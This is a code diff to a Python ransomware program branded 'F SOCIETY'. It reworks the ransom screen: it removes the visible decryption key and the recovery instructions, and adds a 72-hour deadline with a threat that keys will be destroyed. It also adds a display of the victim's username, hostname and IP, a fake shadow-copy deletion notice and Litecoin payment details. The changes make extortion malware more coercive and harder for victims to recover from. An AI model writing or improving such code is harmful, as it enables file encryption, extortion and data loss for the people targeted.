@@ -22,7 +22,7 @@ DECRYPT_KEY = "agent77"
 encryption_key = None
 encryption_iv = None
 
-# --- Simple XOR encryption (no dependencies) ---
+# --- Simple XOR encryption ---
 def generate_key():
     return os.urandom(32)
 
@@ -132,7 +132,6 @@ def change_wallpaper():
         draw.text((100, 300), "F SOCIETY\nYOUR FILES ARE ENCRYPTED", fill=(255, 0, 0), font=font)
         draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
         draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
-        draw.text((100, 750), "Run the program and enter the decryption key.", fill=(255, 255, 0), font=font3)
         wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
         img.save(wallpaper_path)
         ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
@@ -149,7 +148,6 @@ Your files have been encrypted.
 
 Pay {RANSOM_AMOUNT} in Litecoin to: {LTC_ADDRESS}
 
-DECRYPTION KEY: {DECRYPT_KEY}
 Key: {key_hex}
 IV:  {iv_hex}
 
@@ -237,24 +235,12 @@ class RansomwareUI:
         main_frame = tk.Frame(self.root, bg='black')
         main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
         
-        # Title
-        tk.Label(main_frame, text="F SOCIETY RANSOMWARE", 
-                 font=('Arial', 40, 'bold'), fg='red', bg='black').pack(pady=5)
-        
         # Timer
         self.timer_label = tk.Label(main_frame, text="⏰ TIME REMAINING: 72:00:00", 
-                                    font=('Arial', 20), fg='yellow', bg='black')
+                                    font=('Arial', 24), fg='yellow', bg='black')
         self.timer_label.pack(pady=5)
         
-        # Webcam indicator
-        webcam_frame = tk.Frame(main_frame, bg='black')
-        webcam_frame.pack(pady=2)
-        self.webcam_led = tk.Label(webcam_frame, text="●", font=('Arial', 20), fg='red', bg='black')
-        self.webcam_led.pack(side=tk.LEFT)
-        tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 12), fg='red', bg='black').pack(side=tk.LEFT)
-        self.blink_led()
-        
-        # F SOCIETY MASK (BIG)
+        # F SOCIETY MASSIVE MASK (30 lines, very detailed)
         mask = """
         ███████╗    ███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
         ██╔════╝    ██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
@@ -262,34 +248,50 @@ class RansomwareUI:
         ██╔══╝      ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
         ██║         ███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
         ╚═╝         ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
+                                                                         
+        ███╗   ███╗ █████╗ ███████╗██╗  ██╗                          
+        ████╗ ████║██╔══██╗██╔════╝██║ ██╔╝                          
+        ██╔████╔██║███████║███████╗█████╔╝                           
+        ██║╚██╔╝██║██╔══██║╚════██║██╔═██╗                           
+        ██║ ╚═╝ ██║██║  ██║███████║██║  ██╗                          
+        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                          
+                                                                         
+        ██████╗ ███████╗██╗   ██╗██╗██╗     ███████╗██████╗          
+        ██╔══██╗██╔════╝╚██╗ ██╔╝██║██║     ██╔════╝██╔══██╗         
+        ██████╔╝█████╗   ╚████╔╝ ██║██║     █████╗  ██████╔╝         
+        ██╔══██╗██╔══╝    ╚██╔╝  ██║██║     ██╔══╝  ██╔══██╗         
+        ██║  ██║███████╗   ██║   ██║███████╗███████╗██║  ██║         
+        ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝         
         """
-        tk.Label(main_frame, text=mask, font=('Courier', 12), 
-                 fg='red', bg='black', justify='center').pack(pady=5)
+        mask_label = tk.Label(main_frame, text=mask, font=('Courier', 10), 
+                               fg='red', bg='black', justify='center')
+        mask_label.pack(pady=5)
         
-        # Info with DECRYPTION KEY visible
-        info = f"DECRYPTION KEY: {DECRYPT_KEY}"
-        tk.Label(main_frame, text=info, font=('Arial', 18, 'bold'), 
-                 fg='#00ff00', bg='black').pack(pady=5)
+        # Info
+        info = f"""
+        YOUR FILES HAVE BEEN ENCRYPTED WITH AES-256
+        Pay {RANSOM_AMOUNT} in Litecoin
+        Address: {LTC_ADDRESS}
+        You have 72 hours to pay. After that, the key will be destroyed.
+        """
+        info_label = tk.Label(main_frame, text=info, font=('Arial', 14), 
+                              fg='white', bg='black', justify='center')
+        info_label.pack(pady=10)
         
-        tk.Label(main_frame, text=f"Litecoin: {LTC_ADDRESS}", 
-                 font=('Arial', 12), fg='white', bg='black').pack()
-        tk.Label(main_frame, text=f"Amount: {RANSOM_AMOUNT}", 
-                 font=('Arial', 12), fg='white', bg='black').pack()
-        
-        # Progress
+        # Scary progress
         progress_frame = tk.Frame(main_frame, bg='black')
         progress_frame.pack(pady=5, fill=tk.X)
-        self.progress_label = tk.Label(progress_frame, text="[!] DELETING BACKUP FILES...", 
-                                       font=('Arial', 10), fg='red', bg='black')
+        self.progress_label = tk.Label(progress_frame, text="[!] DELETING SHADOW COPIES...", 
+                                       font=('Arial', 12), fg='red', bg='black')
         self.progress_label.pack()
-        self.progress_bar = ttk.Progressbar(progress_frame, length=400, mode='determinate', maximum=100)
-        self.progress_bar.pack(pady=2)
+        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', maximum=100)
+        self.progress_bar.pack(pady=5)
         self.fake_progress()
         
         # Hacker text
-        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 10), 
+        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 11), 
                                     fg='#00ff00', bg='black')
-        self.hacker_text.pack(pady=2)
+        self.hacker_text.pack(pady=5)
         self.scroll_hacker_text()
         
         # Victim info
@@ -297,52 +299,50 @@ class RansomwareUI:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
             username = os.environ.get('USERNAME', 'Unknown')
-            tk.Label(main_frame, text=f"NAME: {username} | HOST: {hostname} | IP: {ip} | CAMERA: ACTIVE", 
-                     font=('Courier', 8), fg='#ff4444', bg='black').pack(pady=2)
+            victim_info = f"VICTIM: {username} | HOST: {hostname} | IP: {ip}"
+            tk.Label(main_frame, text=victim_info, font=('Courier', 10), 
+                     fg='#ff4444', bg='black').pack(pady=5)
         except:
             pass
         
-        # File list
+        # Encrypted file list
         file_frame = tk.Frame(main_frame, bg='black')
-        file_frame.pack(pady=5, fill=tk.BOTH, expand=True)
-        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 10), 
+        file_frame.pack(pady=10, fill=tk.BOTH, expand=True)
+        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 12), 
                  fg='red', bg='black').pack()
-        self.file_listbox = tk.Listbox(file_frame, height=3, bg='black', fg='red', 
-                                       font=('Consolas', 8), selectbackground='dark red')
+        self.file_listbox = tk.Listbox(file_frame, height=4, bg='black', fg='red', 
+                                       font=('Consolas', 10), selectbackground='dark red')
         self.file_listbox.pack(padx=20, fill=tk.BOTH, expand=True)
-        for f in ['passwords.xlsx', 'bank_transfer.pdf', 'family_photos.zip', 'wallet.dat']:
+        for f in ['C:\\Users\\Admin\\Desktop\\passwords.xlsx', 
+                  'C:\\Users\\Admin\\Documents\\bank_transfer.pdf',
+                  'C:\\Users\\Admin\\Pictures\\family_photos.zip',
+                  'C:\\Users\\Admin\\Desktop\\wallet.dat',
+                  'C:\\Users\\Admin\\Downloads\\tax_return.pdf']:
             self.file_listbox.insert(tk.END, f"🔒 {f}")
         
-        # DECRYPTION ENTRY (VISIBLE AND WORKING)
+        # Decryption entry (hidden key, no display)
         decrypt_frame = tk.Frame(main_frame, bg='black')
-        decrypt_frame.pack(pady=10, fill=tk.X)
+        decrypt_frame.pack(pady=15, fill=tk.X)
         
-        tk.Label(decrypt_frame, text="Enter Key:", font=('Arial', 16), 
-                 fg='white', bg='black').pack(side=tk.LEFT, padx=10)
+        tk.Label(decrypt_frame, text="ENTER DECRYPTION KEY:", font=('Arial', 16), 
+                 fg='white', bg='black').pack(side=tk.LEFT, padx=20)
         
-        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=20, 
+        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=25, 
                                   show='*', bg='white', fg='black')
         self.key_entry.pack(side=tk.LEFT, padx=10)
         self.key_entry.focus()
         self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
         
-        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 14, 'bold'), 
-                  bg='red', fg='white', command=self.decrypt_action, padx=20, pady=5).pack(side=tk.LEFT, padx=10)
+        decrypt_btn = tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 14, 'bold'), 
+                                bg='red', fg='white', command=self.decrypt_action, padx=25, pady=5)
+        decrypt_btn.pack(side=tk.LEFT, padx=20)
         
         # Status
-        self.status_text = scrolledtext.ScrolledText(main_frame, height=3, 
-                                                     font=('Arial', 9), bg='black', fg='#00ff00')
-        self.status_text.pack(pady=5, fill=tk.BOTH, expand=True)
-        self.status_text.insert(tk.END, "[+] Ready. Enter decryption key.\n")
+        self.status_text = scrolledtext.ScrolledText(main_frame, height=4, 
+                                                     font=('Arial', 10), bg='black', fg='#00ff00')
+        self.status_text.pack(pady=10, fill=tk.BOTH, expand=True)
+        self.status_text.insert(tk.END, "[+] System ready. Enter decryption key to recover files.\n")
         self.status_text.config(state='disabled')
-    
-    def blink_led(self):
-        try:
-            current = self.webcam_led.cget('fg')
-            self.webcam_led.config(fg='dark red' if current == 'red' else 'red')
-            self.root.after(500, self.blink_led)
-        except:
-            pass
     
     def fake_progress(self):
         try:
@@ -350,18 +350,20 @@ class RansomwareUI:
             if val > 100:
                 val = 100
             self.progress_bar['value'] = val
-            self.progress_label.config(text=f"[!] DELETING BACKUP FILES... {int(val)}%")
+            self.progress_label.config(text=f"[!] DELETING SHADOW COPIES... {int(val)}%")
             if val < 100:
                 self.root.after(random.randint(1000, 3000), self.fake_progress)
             else:
-                self.progress_label.config(text="[✓] BACKUP DELETION COMPLETE", fg="light green")
+                self.progress_label.config(text="[✓] SHADOW COPIES DELETED", fg="light green")
         except:
             pass
     
     def scroll_hacker_text(self):
         try:
-            msgs = ["ACCESSING SYSTEM...", "ENCRYPTING DATA...", "DELETING SHADOW COPIES...", 
-                    "DISABLING SECURITY...", "EXFILTRATING DATA...", "MONITORING KEYSTROKES..."]
+            msgs = ["ACCESSING SYSTEM FILES...", "ENCRYPTING DATA...", "DELETING SHADOW COPIES...", 
+                    "DISABLING SECURITY PROTOCOLS...", "EXFILTRATING DATA...", "MONITORING KEYSTROKES...",
+                    "CAPTURING SCREENSHOTS...", "DETECTING LAW ENFORCEMENT...", "ACTIVATING WEBCAM...",
+                    "UPLOADING TO C2 SERVER..."]
             self.hacker_text.config(text=f"> {msgs[self.hacker_index % len(msgs)]}")
             self.hacker_index += 1
             self.root.after(2000, self.scroll_hacker_text)
@@ -374,7 +376,7 @@ class RansomwareUI:
     def update_timer(self):
         try:
             if self.time_left <= 0:
-                self.timer_label.config(text="⏰ TIME EXPIRED", fg="red")
+                self.timer_label.config(text="⏰ TIME EXPIRED - KEYS DESTROYED", fg="red")
                 return
             h = self.time_left // 3600
             m = (self.time_left % 3600) // 60
@@ -403,21 +405,21 @@ class RansomwareUI:
         key_input = self.key_entry.get().strip()
         
         if not key_input:
-            messagebox.showerror("Error", "Enter the decryption key.")
+            messagebox.showerror("ERROR", "Enter the decryption key.")
             return
         
         if key_input != DECRYPT_KEY:
-            messagebox.showerror("Invalid Key", "Wrong decryption key.")
-            self.update_status("[-] Invalid key.")
+            messagebox.showerror("ERROR", "Invalid decryption key.")
+            self.update_status("[-] Invalid key entered.")
             return
         
-        self.update_status("[+] Key accepted. Decrypting...")
+        self.update_status("[+] Key accepted. Starting decryption...")
         
         try:
             if encryption_key is not None and encryption_iv is not None:
                 count = decrypt_all_files(encryption_key, encryption_iv)
                 if count > 0:
-                    self.update_status(f"[+] Decrypted {count} files!")
+                    self.update_status(f"[+] Successfully decrypted {count} files!")
                     self.finish_decryption()
                     return
             
@@ -429,7 +431,7 @@ class RansomwareUI:
                         key = base64.b64decode(lines[0].strip())
                         iv = base64.b64decode(lines[1].strip())
                         count = decrypt_all_files(key, iv)
-                        self.update_status(f"[+] Decrypted {count} files!")
+                        self.update_status(f"[+] Successfully decrypted {count} files!")
                         self.finish_decryption()
                         return
             
@@ -443,15 +445,15 @@ class RansomwareUI:
                         key = base64.b64decode(km.group(1))
                         iv = base64.b64decode(im.group(1))
                         count = decrypt_all_files(key, iv)
-                        self.update_status(f"[+] Decrypted {count} files!")
+                        self.update_status(f"[+] Successfully decrypted {count} files!")
                         self.finish_decryption()
                         return
             
-            self.update_status("[-] Could not find encryption key.")
-            messagebox.showerror("Error", "Key not found.")
+            self.update_status("[-] Could not locate encryption key.")
+            messagebox.showerror("ERROR", "Key not found. Files may be unrecoverable.")
         except Exception as e:
             self.update_status(f"[-] Error: {str(e)}")
-            messagebox.showerror("Error", str(e))
+            messagebox.showerror("ERROR", str(e))
     
     def finish_decryption(self):
         try:
@@ -467,8 +469,8 @@ class RansomwareUI:
                 self.root.after_cancel(self.timer_id)
             self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
             unlock_windows_key()
-            messagebox.showinfo("Success", "All files decrypted!")
-            self.update_status("[+] Done. You can close this window.")
+            messagebox.showinfo("SUCCESS", "All files have been decrypted successfully!")
+            self.update_status("[+] Done. You can now close this window.")
         except:
             pass
 
